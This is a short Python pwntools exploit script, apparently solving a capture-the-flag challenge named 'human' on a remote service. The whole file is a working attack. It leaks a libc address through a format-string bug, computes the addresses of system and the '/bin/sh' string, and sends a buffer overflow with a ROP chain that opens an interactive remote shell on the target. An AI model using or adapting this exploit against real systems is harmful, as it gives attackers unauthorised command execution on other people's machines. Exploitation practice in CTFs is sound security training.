# coding:utf-8
from pwn import *

context(arch='amd64', os='linux', log_level='DEBUG')
p = remote('114.116.54.89', 10005)
#p=process('./human')

p.recvline()
p.recvline()
p.sendline('%11$p')

libc_leak = int(p.recvuntil('\n')[2:-1], 16)
offset___libc_start_main_ret = 0x20830
offset_system = 0x0000000000045390
offset_str_bin_sh = 0x18cd57

base = libc_leak - offset___libc_start_main_ret
system_addr = base + offset_system
binsh_addr = base + offset_str_bin_sh

pop_rdi = 0x400933

payload = '鸽子真香'.ljust(0x28, 'a')
payload += p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)

p.recvuntil('?\n')
p.sendline(payload)

p.interactive()